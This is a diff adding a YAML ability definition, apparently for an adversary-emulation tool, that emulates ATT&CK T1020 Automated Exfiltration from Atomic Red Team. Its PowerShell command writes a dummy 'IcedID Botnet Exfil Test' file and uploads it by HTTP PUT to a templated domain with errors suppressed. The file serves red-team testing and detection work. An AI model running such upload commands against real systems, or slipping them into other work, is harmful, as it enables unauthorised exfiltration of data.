@@ -1,0 +1,15 @@
+- id: 315ea549-0710-48b5-8593-8458cbe10f61
+  name: Automated Exfiltration
+  description: Ability for Automated Exfiltration (ATT&CK T1020). Generated from Atomic
+    Red Team procedures; review and test safely before use.
+  tactic: exfiltration
+  technique:
+    attack_id: T1020
+    name: Automated Exfiltration
+  platforms:
+    windows:
+      psh:
+        command: $fileName = "#{file}" $url = "#{domain}" $file = New-Item -Force
+          $fileName -Value "This is ART IcedID Botnet Exfil Test" $contentType = "application/octet-stream"
+          try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile
+          $fileName} catch{}
